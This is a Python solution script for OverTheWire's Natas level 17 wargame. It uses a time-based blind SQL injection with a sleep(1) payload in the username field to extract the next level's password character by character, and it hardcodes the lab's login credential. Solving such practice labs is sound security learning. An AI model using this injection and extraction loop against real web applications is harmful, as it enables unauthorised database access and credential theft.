import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas17', "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw")

l = ""
c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"

# for i in c:
# 	u = 'natas18" and password like binary "%{0}%" and sleep(1) #'.format(i)
# 	Data = {'username':u}
# 	req = requests.post("http://natas17.natas.labs.overthewire.org", auth=Auth, data=Data)
# 	if req.elapsed.seconds >= 1:
# 		l += i
# 		print(l)


l = "dghjlmpqsvwxyCDFIKOPR470"
p = ""
c = 0
i = 0

while c != 32:
	u = 'natas18" and password like binary "{0}%" and sleep(1) #'.format(p + l[i])
	Data = {'username':u}
	req = requests.post("http://natas17.natas.labs.overthewire.org", auth=Auth, data=Data)
	if req.elapsed.seconds >= 1:
		p += l[i]
		c += 1
		print(p)
	i += 1
	i = i%len(l)